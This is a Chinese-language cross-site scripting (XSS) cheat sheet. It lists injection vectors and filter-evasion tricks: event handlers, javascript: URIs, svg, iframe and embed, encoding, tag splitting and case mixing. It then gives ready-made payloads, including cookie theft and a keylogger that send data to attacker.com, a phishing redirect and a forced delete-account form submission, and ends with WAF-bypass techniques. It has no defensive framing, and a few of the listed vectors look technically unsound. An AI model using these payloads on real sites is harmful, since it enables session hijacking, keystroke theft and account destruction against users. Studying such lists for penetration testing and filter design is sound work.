# 常见XSS注入手法

1. 存储型: `<script>alert('XSS')</script>`
2. 反射型: `<img src="x" onerror="alert('XSS')">` 变种: `<img src="javascript:alert('XSS')">` | `<img src="data:image/svg+xml;base64,PHN2ZyBpZD0ieCIg...">`
3. DOM-based XSS: `<a href="javascript:alert('XSS')">点击我</a>`
4. HTML 实体编码绕过: `&lt;script&gt;alert('XSS')&lt;/script&gt;` | `\u003cscript\u003ealert('XSS')\u003c/script\u003e` | `<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="></iframe>`
5. 标签拆分绕过: `<scr<script>ipt>alert('XSS')</scr</script>ipt>`
6. 利用 `<svg>` 向量: `<svg onload="alert('XSS')"></svg>` | `<svg><script>eval('alert\x28"XSS"\x29')</script></svg>`
7. 利用事件处理器: `<body onload="alert('XSS')">` | `<div onmouseover="alert('XSS')">悬停我</div>` | `<a href="#" onclick="alert('XSS')">点击我</a>`
8. JavaScript 伪协议（javascript:）: `<a href="javascript:alert('XSS')">点击</a>` | `<a href="JaVaScRiPt:alert('XSS')">点击</a>` | `<a href="javascript:eval('alert\x281\x29')">点击</a>`
9. 利用 `<iframe>` 或 `<embed>`: `<iframe src="javascript:alert('XSS')"></iframe>` | `<embed src="data:text/html,<script>alert('XSS')</script>">`
10. 大小写混合绕过: `<ScRiPt>alert('XSS')</ScRiPt>`
11. 利用注释绕过: `<!--><script>alert('XSS')</script>-->`

## 常见攻击载荷

1. 窃取 Cookie: `<script>fetch('https://attacker.com/steal?cookie=' + document.cookie);</script>`
2. 重定向到钓鱼页面: `<script>window.location.href='http://phishing-site.com';</script>`
3. 键盘记录器:

```js
<script>
document.addEventListener('keypress', function(e) {
  fetch('https://attacker.com/log', {method: 'POST', body: e.key});
});
</script>
```

4. 自动提交表单（CSRF + XSS）:

```js
<script>
let form = document.createElement('form');
form.method = 'POST';
form.action = '/delete-account';
document.body.appendChild(form);
form.submit();
</script>
```

## 绕过 WAF技巧

1. 使用 `String.fromCharCode()` 构造字符串:

```js
eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))
// 等价于 alert('XSS')
```

2. 使用模板字符串（ES6）：``${alert`XSS`}``
3. 利用 top、parent、self 等全局对象：`top['alert']('XSS')`
